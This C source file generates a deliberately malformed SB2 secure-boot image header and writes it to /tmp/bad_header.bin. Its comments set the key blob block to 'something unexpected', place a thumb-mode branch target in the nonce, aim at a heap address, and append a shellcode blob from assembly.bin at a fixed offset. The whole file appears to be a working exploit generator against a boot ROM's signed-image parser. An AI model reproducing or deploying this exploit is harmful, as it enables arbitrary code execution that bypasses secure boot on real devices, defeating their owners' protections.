#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <errno.h>

typedef uint32_t section_id_t;

struct version_t
{
    uint16_t m_major;
    uint16_t m_pad0;
    uint16_t m_minor;
    uint16_t m_pad1;
    uint16_t m_revision;
    uint16_t m_pad2;
};

typedef struct version_t version_t;

    struct sb2_header_t
    {
        uint32_t nonce[4];            //!< Nonce for AES-CTR
        
        uint32_t reserved;            //!< Reserved, un-used
        uint8_t m_signature[4];       //!< 'STMP', see #ROM_IMAGE_HEADER_SIGNATURE.
        uint8_t m_majorVersion;       //!< Major version for the image format, see #ROM_BOOT_IMAGE_MAJOR_VERSION.
        uint8_t m_minorVersion;       //!< Minor version of the boot image format, see #ROM_BOOT_IMAGE_MINOR_VERSION.
        
        uint16_t m_flags;             //!< Flags or options associated with the entire image.
        uint32_t m_imageBlocks;       //!< Size of entire image in blocks.
        uint32_t m_firstBootTagBlock; //!< Offset from start of file to the first boot tag, in blocks.
        section_id_t m_firstBootableSectionID; //!< ID of section to start booting from.
        
        uint32_t m_offsetToCertificateBlockInBytes;     //! Offset in bytes to the certificate block header for a signed SB file.
        
        uint16_t m_headerBlocks;               //!< Size of this header, including this size word, in blocks.
        
        uint16_t m_keyBlobBlock;      //!< Block number where the key blob starts
        uint16_t m_keyBlobBlockCount; //!< Number of cipher blocks occupied by the key blob. 
        uint16_t m_maxSectionMacCount; //!< Maximum number of HMAC table entries used in all sections of the SB file.
        uint8_t m_signature2[4];      //!< Always set to 'sgtl'
        
        uint64_t m_timestamp;         //!< Timestamp when image was generated in microseconds since 1-1-2000.
        version_t m_productVersion;   //!< User controlled product version.
        version_t m_componentVersion; //!< User controlled component version.
        uint32_t m_buildNumber;          //!< User controlled build number.
        uint8_t m_padding1[4];        //!< Padding to round up to next cipher block.
    };

int main() {
	struct sb2_header_t header = { 0 };

	//uint32_t blank[4096/4] = { 0 };
	// This is waaaay more than we need but it gives us space
	uint32_t extra_bytes[1000+0x4000] =  { 0 };
	int in_fd, out_fd, assembly_fd, ret, size;
	struct stat st;

	// Extra data used for sb2 checking?
	header.nonce[0] = 0x00000e8f;
	// Branch target!
	// Remember to set the low bit for thumb mode
	header.nonce[1] = 0x1301ae71;
	//header.nonce[1] = 0x14005aa1;
	// Branch to self (just for testing)
	header.nonce[2] = 0xe7fee7fe;
	// Extra 
	header.nonce[3] = 0x44444444;

	// standard
	header.m_signature[0] = 'S';
    	header.m_signature[1] = 'T';
    	header.m_signature[2] = 'M';
    	header.m_signature[3] = 'P';
	header.m_majorVersion = 2;
	header.m_minorVersion = 1;
	// signed and encrypted
	header.m_flags = 0x8;

	// total number of image blocks, needs to account for how much
	// we are sending
	//header.m_imageBlocks = 0x41;
	header.m_imageBlocks = 0x800;

	// Needs to be > than the key blob block
	header.m_firstBootTagBlock = 0x600;

	// set a value for the cet offset
	header.m_offsetToCertificateBlockInBytes = 0x550;
	header.m_headerBlocks = 0x6;

	// Our magic: set this to something unexpected!
	//header.m_keyBlobBlock = 0x480;
	header.m_keyBlobBlock = 0x3e;


	header.m_keyBlobBlockCount = 0x1;
	header.m_maxSectionMacCount = 0x5;

	header.m_signature2[0] = 's';
	header.m_signature2[1] = 'g';
	header.m_signature2[2] = 't';
	header.m_signature2[3] = 'l';

	// Part of this needs to be zero when we copy
	header.m_timestamp = 0x0;

	memset(extra_bytes, 0, sizeof(extra_bytes));

	// this byte needs to be 0
	extra_bytes[36] = 0x0;

	// This is our target heap
	extra_bytes[114] = 0x14001478;
	// Heap size
	extra_bytes[115] = 0x4000;
	// afterwards is heap bytes -- we can't overwrite this!

	in_fd = open("assembly.bin", O_RDONLY);

	if (in_fd < 0) {
		printf("failed to open assembly");
		exit(1);
	}

	
	fstat(in_fd, &st);
	size = st.st_size;

	#define BASE 220

	extra_bytes[BASE-1] = 0x55555555;
	extra_bytes[BASE] = 0x12345678;
	extra_bytes[BASE+1] = 0x12345678;
	extra_bytes[BASE+2] = 0x12345678;
	extra_bytes[BASE+3] = 0x12345678;
	extra_bytes[BASE+4] = 0x55555555;

	ret = read(in_fd, &extra_bytes[0x1140], size);
	
	if (ret < 0) {
		printf("failed to read");
		exit(1);
	}

	printf("read %d\n", ret);
	out_fd = open("/tmp/bad_header.bin", O_WRONLY | O_CREAT, 0666);

	if (out_fd < 0) {
		printf("failed to open %s \n", strerror(errno));
		exit(-1);
	}

	write(out_fd, (void *) &header, sizeof(header));

	write(out_fd, (void *)extra_bytes, sizeof(extra_bytes));

	close(out_fd);

	printf("Done.\n");
	 
}
